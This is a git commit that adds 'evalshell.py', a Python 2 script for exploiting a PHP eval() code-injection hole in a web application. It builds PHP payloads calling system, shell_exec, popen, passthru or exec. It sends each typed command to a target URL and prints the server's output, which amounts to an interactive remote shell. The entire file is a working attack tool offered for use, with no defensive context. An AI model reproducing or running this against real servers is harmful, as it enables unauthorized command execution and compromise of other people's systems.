fffa86ef1fc80e346997c93631f522bd76b5cbe0
cno-io <40723360+cno-io@users.noreply.github.com>
2020-07-28 22:33:07 -0600

    20200728

---
+++ evalshell/evalshell.py
@@ -0,0 +1,86 @@
+#!/usr/bin/python
+
+import sys
+import requests
+
+print """
+
+███████╗██╗   ██╗ █████╗ ██╗     ███████╗██╗  ██╗███████╗██╗     ██╗     
+██╔════╝██║   ██║██╔══██╗██║     ██╔════╝██║  ██║██╔════╝██║     ██║     
+█████╗  ██║   ██║███████║██║     ███████╗███████║█████╗  ██║     ██║     
+██╔══╝  ╚██╗ ██╔╝██╔══██║██║     ╚════██║██╔══██║██╔══╝  ██║     ██║     
+███████╗ ╚████╔╝ ██║  ██║███████╗███████║██║  ██║███████╗███████╗███████╗
+╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+                                                                  
+"""
+
+if len(sys.argv) != 2:
+    print "Usage: ./evalshell.py <targeturl>"
+    print "Example: ./evalshell.py http://localhost/test.php?eval="
+    sys.exit(0)
+
+url = sys.argv[1]
+
+print "Select execution type to use\n"
+print "1. system() function"
+print "2. shell_exec() function"
+print "3. popen() function"
+print "4. passthru() function"
+print "5. exec() function"
+func = raw_input("Function to use: ")
+if func == "1":
+    print "[+] Using system"
+    while True:
+        command = raw_input("shell:~$ ")
+        if command == "exit":
+            sys.exit(0)
+        else:
+            evilphp = "system('" + command + "');"
+            requri = url + evilphp
+            r = requests.get(requri)
+            print r.text
+elif func == "2":
+    print "[+] Using shell_exec"
+    while True:
+        command = raw_input("shell:~$ ")
+        if command == "exit":
+            sys.exit(0)
+        else:
+            evilphp = "echo shell_exec('" + command + "');"
+            requri = url + evilphp
+            r = requests.get(requri)
+            print r.text
+elif func == "3":
+    print "[+] Using popen"
+    while True:
+        command = raw_input("shell:~$ ")
+        if command == "exit":
+            sys.exit(0)
+        else:
+            evilphp = "popen('" + command + "');"
+            requri = url + evilphp
+            r = requests.get(requri)
+            print r.text
+elif func == "4":
+    print "[+] Using passthru"
+    while True:
+        command = raw_input("shell:~$ ")
+        if command == "exit":
+            sys.exit(0)
+        else:
+            evilphp = "passthru('" + command + "');"
+            requri = url + evilphp
+            r = requests.get(requri)
+            print r.text
+elif func == "5":
+    print "[+] Using exec"
+    while True:
+        command = raw_input("shell:~$ ")
+        if command == "exit":
+            sys.exit(0)
+        else:
+            evilphp = "echo exec('" + command + "');"
+            requri = url + evilphp
+            r = requests.get(requri)
+            print r.text
+
